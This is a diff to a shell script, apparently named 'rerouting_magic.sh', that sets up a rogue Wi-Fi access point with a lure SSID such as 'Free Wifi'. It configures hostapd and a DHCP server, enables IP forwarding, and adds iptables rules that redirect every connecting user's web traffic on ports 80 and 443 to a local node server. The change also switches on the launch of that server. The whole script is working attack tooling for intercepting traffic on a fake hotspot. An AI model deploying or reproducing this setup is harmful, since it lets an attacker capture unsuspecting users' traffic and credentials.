@@ -2,8 +2,8 @@
 # and will redirect all the traffic to the ip of the node server running on port 8000 and 8443
 
 print_usage(){
-    echo "Usage: ./rerouting_magic.sh --attack <attack_interface> --net <net_interface> --ssid <ssid>"
-    echo "Example: ./rerouting_magic.sh --attack wlxc83a35c2e0bb --net wlp2s0 --ssid \"Free Wifi\""
+    echo "Usage: ./rerouting_magic.sh --ap <FAKE_AP_INTERFACE> --net <net_interface> --ssid <ssid>"
+    echo "Example: ./rerouting_magic.sh --ap wlxc83a35c2e0bb --net wlp2s0 --ssid \"Free Wifi\""
 }
 
 log(){
@@ -14,8 +14,8 @@ set -o errexit
 
 while [ "$1" != "" ]; do
     case $1 in
-        --attack )              shift
-                                ATTACK_INTERFACE=$1
+        --ap )              shift
+                                FAKE_AP_INTERFACE=$1
                                 ;;
         --net )                 shift
                                 NET_INTERFACE=$1
@@ -27,7 +27,7 @@ while [ "$1" != "" ]; do
     shift
 done
 
-if [ -z "$ATTACK_INTERFACE" ] || [ -z "$NET_INTERFACE" ]; then
+if [ -z "$FAKE_AP_INTERFACE" ] || [ -z "$NET_INTERFACE" ]; then
     print_usage
     exit 1
 fi
@@ -40,7 +40,7 @@ if [ "$EUID" -ne 0 ] ; then
 fi > /dev/null 2>&1
 
 log "starting rerouting magic"
-log "Attack interface: $ATTACK_INTERFACE"
+log "Attack interface: $FAKE_AP_INTERFACE"
 log "Net interface: $NET_INTERFACE"
 
 apt install hostapd isc-dhcp-server -y > /dev/null 2>&1
@@ -52,7 +52,7 @@ sudo cp /etc/default/isc-dhcp-server /etc/default/isc-dhcp-server.bak
 echo  "
 DHCPDv4_CONF=/etc/dhcp/dhcpd.conf
 DHCPDv4_PID=/var/run/dhcpd.pid
-INTERFACESv4=\"$ATTACK_INTERFACE\"
+INTERFACESv4=\"$FAKE_AP_INTERFACE\"
 " > /etc/default/isc-dhcp-server
 
 # Path: /etc/dhcp/dhcpd.conf
@@ -91,16 +91,16 @@ echo  "DAEMON_CONF=\"/etc/hostapd/hostapd.conf\"" > /etc/default/hostapd
 log "allow forwarding for ipv4"
 sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1
 
-if ifconfig $ATTACK_INTERFACE > /dev/null; then
-    log "interface $ATTACK_INTERFACE exists cunfigure it..."
+if ifconfig $FAKE_AP_INTERFACE > /dev/null; then
+    log "interface $FAKE_AP_INTERFACE exists cunfigure it..."
 else
-  log "interface $ATTACK_INTERFACE does not exist it may be blocked by rfkill, unblocking it..."
-  sudo rfkill unblock wifi; sudo rfkill unblock all; sudo ifconfig $ATTACK_INTERFACE up
+  log "interface $FAKE_AP_INTERFACE does not exist it may be blocked by rfkill, unblocking it..."
+  sudo rfkill unblock wifi; sudo rfkill unblock all; sudo ifconfig $FAKE_AP_INTERFACE up
 fi
 
-ifconfig $ATTACK_INTERFACE down
-ifconfig $ATTACK_INTERFACE inet 10.100.102.50 netmask 255.255.255.0
-ifconfig $ATTACK_INTERFACE up
+ifconfig $FAKE_AP_INTERFACE down
+ifconfig $FAKE_AP_INTERFACE inet 10.100.102.50 netmask 255.255.255.0
+ifconfig $FAKE_AP_INTERFACE up
 
 log "starting hostapd and isc-dhcp-server"
 service hostapd restart
@@ -116,9 +116,7 @@ iptables -t nat -A PREROUTING -i wlxc83a35c2e0bb -p tcp --dport 80 -j DNAT --to-
 iptables -t nat -A PREROUTING -i wlxc83a35c2e0bb -p tcp --dport 443 -j DNAT --to-destination $NET_IP:8443
 iptables -t nat -A POSTROUTING -o $NET_INTERFACE -j MASQUERADE
 
-# log "starting node server"
-# pkill node
-# sleep 1
-# npm run dev &
+log "starting node server"
+nohup npm run dev > server.log &
 
 log "REROUTING MAGIC IS DONE. THE ATTACK INTERFACE IS NOW A WIFI ACCESS POINT WITH THE SSID: $SSID"
